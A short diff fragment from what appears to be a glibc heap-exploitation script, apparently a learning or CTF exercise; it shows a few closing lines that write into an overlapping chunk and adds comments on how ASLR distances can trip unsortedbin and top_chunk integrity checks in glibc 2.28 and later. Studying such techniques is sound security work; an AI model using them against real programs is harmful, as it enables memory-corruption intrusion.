@@ -91,3 +91,11 @@ overlap = malloc(0x88)
 edit(overlap, b"Z"*16 + b"Much win!")
 
 io.interactive()
+
+# Notes:
+# One noticeable fact is, that if under production conditions, when
+# the distance between chunk_B and our target could be really large
+# due to allocation of data and heap segments under ASLR conditions,
+# the distance could be to large to pass unsortedbin integrity checks.
+# Also keep in mind, that this could also influence anz possible
+# top_chunk integrity checks for glibc >= 2.28.
